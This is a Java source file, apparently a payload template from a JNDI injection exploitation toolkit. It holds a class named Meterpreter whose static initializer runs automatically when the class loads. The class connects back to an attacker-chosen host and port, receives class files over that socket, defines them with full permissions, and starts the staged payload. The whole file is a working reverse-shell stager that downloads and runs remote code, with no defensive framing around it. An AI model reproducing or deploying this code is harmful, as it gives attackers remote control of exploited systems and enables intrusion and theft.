package map.jndi.template;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public class Meterpreter extends ClassLoader {
    public static String lHost;
    public static int lPort;

    static {
        try {
            Socket socket = new Socket(lHost, lPort);
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();
            new Meterpreter().bootstrap(in, out, new String[]{"Payload", "--"});
        } catch (Exception ignore) {
        }
    }

    private void bootstrap(InputStream rawIn, OutputStream out, String[] stageParameters) {
        try {
            final DataInputStream in = new DataInputStream(rawIn);
            Class clazz;
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            int length = in.readInt();
            do {
                final byte[] classfile = new byte[length];
                in.readFully(classfile);
                resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
                length = in.readInt();
            } while (length > 0);
            final Object stage = clazz.newInstance();
            clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, stageParameters);
        } catch (final Throwable t) {
            t.printStackTrace(new PrintStream(out));
        }
    }
}
